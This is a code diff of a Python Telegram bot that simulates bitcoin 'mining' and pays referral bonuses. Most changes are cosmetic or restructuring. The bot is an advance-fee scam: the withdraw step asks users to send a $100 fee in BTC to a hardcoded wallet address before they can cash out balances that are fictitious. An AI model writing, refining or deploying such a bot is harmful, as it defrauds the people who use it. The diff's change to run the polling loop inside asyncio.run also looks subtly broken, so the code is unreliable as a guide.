@@ -2,15 +2,15 @@ import os
 import time
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
 
-# Get your bot token from Fly secret
+# Load token from environment
 TOKEN = os.getenv("BOT_TOKEN")
 
 # In-memory user data
 user_data = {}
 
-# Helper to get BTC price
+# Helper: get BTC price
 def get_btc_price():
     try:
         r = requests.get(
@@ -21,7 +21,7 @@ def get_btc_price():
     except Exception:
         return 30000.0
 
-# Sidebar / keyboard
+# Sidebar keyboard
 def get_sidebar():
     keyboard = [
         [InlineKeyboardButton("⛏ Mine", callback_data="mine")],
@@ -36,19 +36,14 @@ def get_sidebar():
 # Ensure user exists
 def ensure_user(user_id):
     if user_id not in user_data:
-        user_data[user_id] = {
-            "balance": 0.0,
-            "wallet": None,
-            "last_check": time.time(),
-            "referral_bonus": 0.0
-        }
+        user_data[user_id] = {"balance": 0.0, "wallet": None, "last_check": time.time(), "referral_bonus": 0.0}
 
-# Start command
+# /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     ensure_user(user_id)
 
-    # Check referral
+    # Handle referral
     if context.args:
         referrer_id = context.args[0]
         if referrer_id != str(user_id):
@@ -62,7 +57,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=get_sidebar()
     )
 
-# Handle buttons
+# Handle button presses
 async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -70,6 +65,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ensure_user(user_id)
     data = user_data[user_id]
 
+    # Update balance
     now = time.time()
     elapsed = now - data["last_check"]
     btc_per_2min = 0.5 / get_btc_price()
@@ -108,8 +104,8 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             fee_btc = 100 / get_btc_price()
             kb = [[InlineKeyboardButton("Confirm Withdraw", callback_data="confirm_withdraw")]]
             await query.edit_message_text(
-                f"📤 To withdraw, first pay a $100 fee ({fee_btc:.6f} BTC) to:\nbc1qrucwx02e0m8v4smp44ferp93ynvsaw277t088f\n"
-                "After payment, press confirm:",
+                f"📤 To withdraw, first pay a $100 fee ({fee_btc:.6f} BTC) to:\n"
+                f"bc1qrucwx02e0m8v4smp44ferp93ynvsaw277t088f\nAfter payment, press confirm:",
                 reply_markup=InlineKeyboardMarkup(kb)
             )
     elif query.data == "confirm_withdraw":
@@ -129,14 +125,14 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=get_sidebar()
         )
     elif query.data == "referral":
-        referral_link = f"https://t.me/YOUR_BOT_USERNAME?start={user_id}"
+        referral_link = f"https://t.me/YourBotUsername?start={user_id}"
         await query.edit_message_text(
             f"👥 Invite friends and earn extra!\n💰 You'll earn $0.10 for every user that uses your referral link.\n\n"
             f"Here is your referral link:\n{referral_link}",
             reply_markup=get_sidebar()
         )
 
-# Handle wallet messages
+# Handle messages (like wallet input)
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     ensure_user(user_id)
@@ -148,12 +144,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Invalid input. Tap buttons below.", reply_markup=get_sidebar())
 
 # Main
-def main():
+async def main():
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    app.run_polling()  # Simple polling, free plan friendly
+    await app.run_polling()  # polling, no port/webhook needed
 
 if __name__ == "__main__":
-    main()
+    import asyncio
+    asyncio.run(main())
